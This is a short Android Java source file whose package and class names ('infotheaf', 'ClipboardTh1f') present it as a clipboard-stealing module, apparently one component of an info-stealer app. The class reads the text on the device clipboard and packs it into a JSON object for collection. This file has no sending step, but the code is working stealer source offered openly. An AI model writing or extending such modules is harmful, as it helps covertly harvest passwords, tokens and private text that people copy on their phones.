package com.example.infotheaf;

import android.content.ClipboardManager;
import android.content.Context;

import org.json.JSONException;
import org.json.JSONObject;

public class ClipboardTh1f {
    private Context mContext;
    private ClipboardManager clipboardManager;
    public ClipboardTh1f(Context mContext){
        this.mContext = mContext;
        this.clipboardManager = (ClipboardManager) mContext.getSystemService(Context.CLIPBOARD_SERVICE);
    }

    public JSONObject getClipboardInfo() throws JSONException {
        JSONObject clipboardInfo = new JSONObject();
        try {
            clipboardInfo.put("Content", this.clipboardManager.getPrimaryClip().getItemAt(0).getText().toString());

//            clipboardInfo.put("Content", this.clipboardManager.getPrimaryClip().getItemAt(0).getText().toString());
        } catch (Exception e) {
            clipboardInfo.put("Content", e.toString());
        }
        return clipboardInfo;
    }
}
